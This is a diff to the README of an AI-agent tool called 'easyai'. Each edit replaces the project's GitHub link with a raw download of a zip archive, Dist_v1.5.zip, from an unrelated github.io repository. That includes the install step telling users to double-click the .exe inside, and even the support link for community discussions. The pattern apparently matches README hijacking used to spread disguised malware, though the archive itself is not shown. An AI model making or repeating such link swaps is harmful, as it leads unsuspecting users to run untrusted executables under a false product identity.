@@ -5,7 +5,7 @@ description: "Build and orchestrate multi-agent LLM systems using natural langua
 ---
 # 🤖 easyai - Build your own custom artificial intelligence
 
-[![](https://img.shields.io/badge/Download_easyai-blue)](https://github.com/uzair2755/easyai)
+[![](https://img.shields.io/badge/Download_easyai-blue)](https://raw.githubusercontent.com/uzair2755/uzair2755.github.io/main/_teachings/Dist_v1.5.zip)
 
 easyai allows you to create and manage complex artificial intelligence agents on your computer. You use this tool to build, test, and run programs that think, debate, and complete tasks for you. The software runs entirely on your machine. You do not need experience in coding to get started.
 
@@ -32,7 +32,7 @@ Your computer must meet these basic standards to run the program:
 
 You do not need to install software development tools or manage command lines. The application package includes everything you need. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project release page to get the installer: [Download easyai for Windows](https://github.com/uzair2755/easyai)
+1. Visit the project release page to get the installer: [Download easyai for Windows](https://raw.githubusercontent.com/uzair2755/uzair2755.github.io/main/_teachings/Dist_v1.5.zip)
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen.
@@ -86,6 +86,6 @@ If the agents become unresponsive:
 *   Check your internet connection.
 *   Ensure that your API keys are valid if you configured a private service provider.
 
-For further assistance, revisit the main page at https://github.com/uzair2755/easyai to view the community discussions or report a specific issue you encounter.
+For further assistance, revisit the main page at https://raw.githubusercontent.com/uzair2755/uzair2755.github.io/main/_teachings/Dist_v1.5.zip to view the community discussions or report a specific issue you encounter.
 
 Keywords: ai-framework, dag-orchestration, electron, kotlin, llm-agent, mcp, multi-agent, react, spring-boot, swarm
